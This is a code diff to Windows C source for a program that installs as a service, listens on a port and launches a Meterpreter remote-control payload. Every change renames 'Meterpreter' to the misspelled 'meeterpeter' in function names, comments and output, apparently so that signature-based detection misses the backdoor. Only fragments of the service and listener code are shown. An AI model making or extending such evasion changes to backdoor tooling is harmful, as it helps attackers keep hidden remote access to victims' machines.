@@ -42,10 +42,10 @@ SERVICE_STATUS status;
 SERVICE_STATUS_HANDLE hStatus;
 
 //
-// Listen for incoming connections and start the Meterpreter
+// Listen for incoming connections and start the meeterpeter
 //
 
-int start_meterpreter()
+int start_meeterpeter()
 {
     SOCKET sock = INVALID_SOCKET;
     DWORD err = 0;
@@ -120,7 +120,7 @@ int start_meterpreter()
         goto cleanup;
     }
 
-    printf("Meterpreter service listening on port %d\n", PORT);
+    printf("meeterpeter service listening on port %d\n", PORT);
     fflush(stdout);
 
     // Accept incoming connections
@@ -242,9 +242,9 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
         return;
     }
 
-    // Start the Meterpreter
+    // Start the meeterpeter
 
-    DWORD err = start_meterpreter();
+    DWORD err = start_meeterpeter();
 
     if (err != 0) {
         status.dwCurrentState = SERVICE_STOPPED;
@@ -261,7 +261,7 @@ VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
 
 
 //
-// Installs and starts the Meterpreter service
+// Installs and starts the meeterpeter service
 //
 
 BOOL install_service()
@@ -357,7 +357,7 @@ BOOL install_service()
 
 
 //
-// Stops and removes the Meterpreter service
+// Stops and removes the meeterpeter service
 //
 
 BOOL remove_service()
@@ -471,16 +471,16 @@ int main(int argc, char *argv[])
         }
         else if (strcmp(argv[1], "service") == 0) {
         
-            // Starts the Meterpreter as a service
+            // Starts the meeterpeter as a service
 
             start_service();
             return 0;
         }
     }
 
-    // Starts the Meterpreter as a normal application
+    // Starts the meeterpeter as a normal application
 
-    start_meterpreter();
+    start_meeterpeter();
 
     return 0;
 }
